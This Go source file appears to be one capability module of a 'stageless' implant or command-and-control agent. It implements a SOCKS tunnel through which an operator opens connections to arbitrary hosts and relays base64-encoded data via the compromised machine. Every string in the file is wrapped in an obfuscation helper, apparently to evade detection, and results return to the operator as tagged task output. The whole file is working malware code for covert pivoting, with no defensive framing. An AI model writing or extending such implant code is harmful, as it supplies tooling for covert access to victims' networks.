package capabilities

import (
	"encoding/base64"
	"encoding/json"

	general "stageless/utils/general"
	"stageless/utils/network/socks"
	"stageless/utils/obf"
)

func jsonErr(msg string) string {
	// Builds a json error payload
	return general.MarshalJSON(map[string]any{obf.S("ok"): false, obf.S("error"): msg})
}

func jsonOk(extra map[string]any) string {
	// Builds a json success payload with the extra fields
	out := map[string]any{obf.S("ok"): true}
	for k, v := range extra {
		out[k] = v
	}
	return general.MarshalJSON(out)
}

func handleSocksConnect(params map[string]any) string {
	// Opens a socks connection and returns the connection id
	host, _ := params[obf.S("host")].(string)
	port := int(params[obf.S("port")].(float64))
	key, ok := socks.Connect(host, port)
	if !ok {
		return jsonErr(obf.S("connect failed"))
	}
	return jsonOk(map[string]any{obf.S("conn_id"): key})
}

func handleSocksRead(params map[string]any) string {
	// Reads bytes from a socks connection and returns them encoded
	cid, _ := params[obf.S("conn_id")].(string)
	max := 65536
	if v, ok := params[obf.S("max")].(float64); ok {
		max = int(v)
	}
	data := socks.Read(cid, max)
	if len(data) == 0 {
		return jsonOk(map[string]any{obf.S("data"): ""})
	}
	return jsonOk(map[string]any{obf.S("data"): base64.StdEncoding.EncodeToString(data)})
}

func handleSocksWrite(params map[string]any) string {
	// Writes decoded bytes to a socks connection
	cid, _ := params[obf.S("conn_id")].(string)
	raw, _ := params[obf.S("data")].(string)
	data, _ := base64.StdEncoding.DecodeString(raw)
	if !socks.Write(cid, data) {
		return jsonErr(obf.S("write failed"))
	}
	return jsonOk(nil)
}

func handleSocksClose(params map[string]any) string {
	// Closes a socks connection
	cid, _ := params[obf.S("conn_id")].(string)
	socks.Close(cid)
	return jsonOk(nil)
}

func runSocksPassive(input, params string) string {
	// Here is where the socks operation is dispatched to the handler
	var p map[string]any
	if err := json.Unmarshal([]byte(params), &p); err != nil {
		return jsonErr(obf.S("bad parameters"))
	}
	switch input {
	case obf.S("connect"):
		return handleSocksConnect(p)
	case obf.S("read"):
		return handleSocksRead(p)
	case obf.S("write"):
		return handleSocksWrite(p)
	case obf.S("close"):
		return handleSocksClose(p)
	default:
		return jsonErr(obf.S("unknown op ") + input)
	}
}

func RunSocks(host, taskTag, input, params string) []byte {
	// Main function that runs a socks task and writes the output message
	_ = host
	payload := runSocksPassive(input, params)
	msg := general.MarshalJSON(map[string]any{
		obf.S("option"):   obf.S("output"),
		obf.S("type"):     obf.S("socks"),
		obf.S("task_tag"): taskTag,
		obf.S("output"):   payload,
	})
	return WriteMsg(msg)
}
